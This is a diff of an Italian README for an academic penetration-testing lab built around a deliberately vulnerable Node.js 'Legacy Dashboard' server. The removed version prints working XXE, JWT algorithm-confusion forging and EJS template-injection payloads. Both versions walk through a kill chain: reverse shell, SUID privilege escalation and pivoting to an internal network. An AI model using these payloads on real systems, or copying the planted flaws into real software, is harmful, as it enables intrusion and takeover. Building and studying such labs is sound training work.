@@ -1,136 +1,100 @@
-# LegacyReportEngine — VM Laboratorio Ethical Hacking
+# 🎯 Progetto Tesi: Compromissione Infrastruttura DMZ e Movimento Laterale (Target 1)
 
-## Struttura del progetto
+Questo repository contiene il codice sorgente e le configurazioni vulnerabili del **Target 1 (DMZ Server)**, parte di un laboratorio di Penetration Testing avanzato sviluppato per scopi di ricerca e tesi accademica. 
 
-```
-legacy-report/
-├── app.js                          ← Entry point Express
-├── setup.js                        ← Setup iniziale (chiavi RSA, .config)
-├── package.json
-│
-├── middleware/
-│   └── jwtVerify.js                ← [VULN] JWT Algorithm Confusion (RS256→HS256)
-│
-├── routes/
-│   ├── auth.js                     ← Login, JWKS endpoint
-│   ├── reports.js                  ← [VULN] XXE in XML parser
-│   └── management.js               ← [VULN] SSTI in EJS renderer
-│
-├── views/
-│   ├── index.ejs                   ← Homepage [HINT: commento HTML]
-│   ├── login.ejs                   ← Form login
-│   ├── token.ejs                   ← Display JWT post-login
-│   ├── reports.ejs                 ← Upload XML
-│   ├── admin.ejs                   ← Pannello admin
-│   └── 403.ejs                     ← Errore accesso
-│
-├── public/
-│   ├── css/style.css
-│   ├── js/dashboard.js             ← [HINT: commento con endpoint JWKS]
-│   └── backup/
-│       └── report_config.xml.bak  ← [HINT: schema JWT, algoritmo RS256]
-│
-└── keys/                           ← Generata da setup.js
-    ├── private.pem
-    └── public.pem
-```
+Lo scenario simula una web application legacy esposta su internet ("Legacy Dashboard"), progettata per dimostrare come catene di vulnerabilità applicative e di configurazione possano portare alla compromissione totale del server e consentire il *Pivoting* verso reti interne isolate.
 
-## Setup sulla VM Ubuntu Server
+---
 
-```bash
-# 1. Installa Node.js 18+
-curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
-sudo apt-get install -y nodejs
+## ⚙️ Architettura e Tecnologie
 
-# 2. Copia il progetto in /opt/app/legacy-report
-sudo mkdir -p /opt/app
-sudo cp -r legacy-report /opt/app/
-cd /opt/app/legacy-report
+* **Sistema Operativo:** Linux (Ubuntu/Debian)
+* **Web Server:** Node.js con framework Express
+* **Template Engine:** EJS (Embedded JavaScript templates)
+* **Ruolo di Rete:** Server esposto in DMZ (Dual-homed: connesso a Internet e alla rete interna `10.0.0.x`).
+* **Principi Violati (OWASP Top 10):**
+    * A01:2021 - Broken Access Control
+    * A02:2021 - Cryptographic Failures (JWT Algorithm Confusion)
+    * A03:2021 - Injection (XXE, SSTI)
+    * A05:2021 - Security Misconfiguration
 
-# 3. Installa dipendenze
-npm install
+---
 
-# 4. Esegui setup (genera chiavi RSA + /opt/app/.config)
-sudo node setup.js
+## ⛓️ Full Cyber Kill Chain (Il Flusso di Attacco)
 
-# 5. Avvia l'applicazione
-node app.js
-# oppure con pm2:
-# pm2 start app.js --name legacy-report
-```
+Il laboratorio è progettato per essere risolto seguendo una precisa metodologia per fasi:
 
-## Kill chain — prospettiva attaccante
+### Fase 1: Ricognizione ed Enumerazione (Reconnaissance)
+L'attacco ha inizio con la mappatura dei servizi esposti sulla macchina Target (IP `192.168.1.192`):
+* **Nmap Scanning:** Una scansione mirata (`nmap -sC -sV -O`) rivela l'apertura delle porte 22 (SSH) e 3000 (HTTP/Node.js).
+* **Directory Enumeration:** L'analisi del codice sorgente (`view-source`) rivela l'uso di EJS. L'utilizzo di strumenti come `dirb` espone path critici, in particolare `/login`, `/reports` e un'area riservata `/management` protetta da errore 401 (Unauthorized).
 
-### Fase 1 — Recon passiva
-- Sorgente HTML di `/` → commento con `/management/dashboard`
-- `/public/js/dashboard.js` → commento con `/.well-known/jwks.json`
-- `/public/backup/report_config.xml.bak` → schema JWT, algoritmo RS256
+### Fase 2: Initial Access & Information Disclosure (XXE)
+L'endpoint `/reports` accetta il caricamento di file XML per la gestione documentale aziendale, risultando vulnerabile a **XML External Entity (XXE) Injection**.
+1. L'attaccante verifica la falla leggendo `/etc/passwd`, scoprendo gli utenti di sistema `dmz-server` e l'account di servizio `legacyreport` (con home directory `/opt/app`).
+2. **Il trucco del Path Virtuale:** Impossibilitato a listare le directory, l'attaccante sfrutta il symlink di Linux `file:///proc/self/cwd/` per estrarre file dalla directory di lavoro del processo web.
+3. Estraendo il file `package.json`, mappa le dipendenze (es. `jsonwebtoken`) e gli entry-point dell'app. Attraverso lo stesso vettore, legge il file sorgente `routes/auth.js`.
 
-### Fase 2 — XXE
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE report [
-  <!ENTITY xxe SYSTEM "file:///opt/app/legacy-report/keys/public.pem">
-]>
-<report>
-  <title>&xxe;</title>
-  <body>test</body>
-</report>
-```
-Upload su `/reports` → riceve `public.pem` nel campo titolo.
+### Fase 3: Authentication Bypass (JWT Algorithm Confusion)
+La lettura del codice sorgente rivela credenziali a basso privilegio hardcoded (`guest:guest123`) e svela una vulnerabilità critica nel middleware di validazione dei token: il **Trust Boundary Violation** (CVE-2015-9256).
+1. L'attaccante estrae la chiave pubblica RSA esposta dal server (`/.well-known/jwks.json`).
+2. Sfruttando la mancanza di una whitelist di algoritmi nel backend, l'attaccante forgia un token JWT modificando l'header in `alg: HS256` e il payload in `role: admin`.
+3. Il token viene firmato simmetricamente usando il modulo `n` della chiave pubblica come secret HMAC. Il server verifica positivamente la firma, garantendo l'accesso non autorizzato all'endpoint `/management/dashboard`.
 
-### Fase 3 — Login guest
-```
-POST /api/auth/login
-username=guest&password=guest123
-```
-Riceve JWT con `role: user`. Decodifica per capire la struttura.
+### Fase 4: Remote Code Execution (SSTI)
+All'interno del pannello di amministrazione, il meccanismo di rendering dei report soffre di **Server-Side Template Injection (SSTI)**.
+* **Frontend Evasion:** L'attaccante aggira i blocchi di validazione JavaScript lato client forzando l'inserimento del token JWT contraffatto direttamente nel `sessionStorage` del browser.
+* **Asynchronous Reverse Shell:** Inettando un payload Node.js asincrono nel template EJS (`require('child_process').spawn`), l'attaccante stabilisce una Reverse Shell interattiva verso la macchina Kali, agganciando l'utente `legacyreport`.
 
-### Fase 4 — JWT Algorithm Confusion (RS256 → HS256)
-```python
-import jwt, base64
-from cryptography.hazmat.primitives import serialization
+### Fase 5: Privilege Escalation (Security Misconfiguration)
+La scalata ai privilegi massimi sfrutta il principio del "Least Privilege" implementato in modo errato dagli amministratori.
+* L'enumerazione locale (`sudo -l`) rivela che l'utente `legacyreport` possiede diritti sudo *passwordless* per riavviare il demone `/etc/systemd/system/legacy-monitor.service`.
+* L'eseguibile richiamato dal demone (`/opt/app/monitor.sh`) risulta scrivibile dall'utente compromesso.
+* L'attaccante sovrascrive lo script iniettando istruzioni per copiare la `/bin/bash` in locale e assegnarle il bit **SUID**. Riavviando il servizio, la trappola scatta ed elargisce una shell `root`.
 
-# Carica la public key ottenuta via XXE
-with open('public.pem', 'rb') as f:
-    pub_key = f.read()
+### Fase 6: Post-Exploitation e Network Discovery
+Ottenuto l'accesso `root`, l'attaccante raccoglie gli "Artifacts" per pianificare il movimento laterale. Attraverso l'ispezione di file ambientali (`.env`), script di debug dimenticati (`test_backend.py`) e la cronologia dell'amministratore (`.bash_history`), scopre:
+* La topologia della rete interna isolata (`10.0.0.x`).
+* Il Target Intermedio (**Legacy-Data-Processor**: `10.0.0.5:5000`).
+* Il vettore di attacco futuro: l'utilizzo di serializzazione nativa Python (`pickle` e `base64`) per la trasmissione dati inter-server (Insecure Deserialization).
 
-# Forgia token con HS256 firmato con la chiave pubblica come secret
-forged = jwt.encode(
-    {"user": "admin", "role": "admin"},
-    pub_key,
-    algorithm="HS256"
-)
-print(forged)
-```
+---
 
-### Fase 5 — Accesso admin
-```bash
-curl -H "Authorization: Bearer <token_forgiato>" \
-     http://<VM_IP>:3000/management/dashboard
-```
+## 🎓 Ostacoli Tecnici e Realismo del Sistema
 
-### Fase 6 — SSTI → RCE
-Nel campo "Corpo del messaggio" del form template:
-```
-<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
-```
-Oppure lettura file:
-```
-<%= global.process.mainModule.require('fs').readFileSync('/opt/app/.config','utf8') %>
-```
+Questo laboratorio è ingegnerizzato per riflettere dinamiche reali di mitigazione e hardening, obbligando l'attaccante a deviare dai percorsi di exploit standard:
+* **Il Flaw Logico JWT:** Il backend applica un parsing manuale dell'header JWT per isolare e dimostrare accademicamente la falla architetturale originaria, senza l'interferenza delle "regex patch" aggiunte silenziosamente dalle librerie moderne, richiedendo una forgiatura chirurgica tramite script custom o `jwt_tool`.
+* **Systemd PrivateTmp & nosuid:** Durante la Privilege Escalation, i tentativi di creare la shell SUID in `/tmp` vengono intercettati e annullati dalle flag `nosuid` e dall'isolamento temporaneo generato dal modulo `PrivateTmp` di systemd.
 
-## Credenziali di accesso (non admin)
-| Username | Password |
-|----------|----------|
-| guest    | guest123 |
-| viewer   | view2024 |
+---
 
-Non esiste un account admin raggiungibile tramite login.
-L'unico modo per ottenere `role: admin` è forgiare il token JWT.
+## 🛠️ Setup del Laboratorio (Istruzioni di Deploy)
 
-## Note per il docente
-- `/opt/app/.config` contiene `INTERNAL_NETWORK_HOST` e credenziali DB
-  per il pivot alla rete interna (VM successiva)
-- Le vulnerabilità sono documentate nei commenti del codice sorgente
-- Ogni fase è indipendente ma necessaria per quella successiva
+Per ricreare questo ambiente su una macchina virtuale Linux vergine:
+
+1.  **Clonare il repository:**
+    ```bash
+    git clone [https://github.com/TUO-NOME/legacy-report-dmz-lab.git](https://github.com/TUO-NOME/legacy-report-dmz-lab.git)
+    cd legacy-report-dmz-lab
+    ```
+
+2.  **Installare le dipendenze dell'app:**
+    ```bash
+    cd src
+    npm install
+    ```
+
+3.  **Configurare le vulnerabilità di sistema (Richiede privilegi di Root):**
+    Configurare l'utente di servizio (`legacyreport`) e copiare i file dalla cartella `vulnerable_configs/` nelle rispettive directory di sistema preservando i permessi di scrittura intenzionalmente errati:
+    * `/etc/systemd/system/legacy-monitor.service` (Demone)
+    * `/etc/sudoers.d/legacy-monitor` (Policy Sudo)
+    * `/opt/app/monitor.sh` (Script esca)
+    * `/root/.bash_history` (Indizi Post-Exploitation)
+
+4.  **Avviare l'applicazione:**
+    ```bash
+    node app.js
+    ```
+
+---
+*Disclaimer: Questo progetto è stato realizzato esclusivamente a scopo accademico e di ricerca. Qualsiasi utilizzo delle tecniche qui descritte su sistemi non autorizzati è strettamente proibito.*
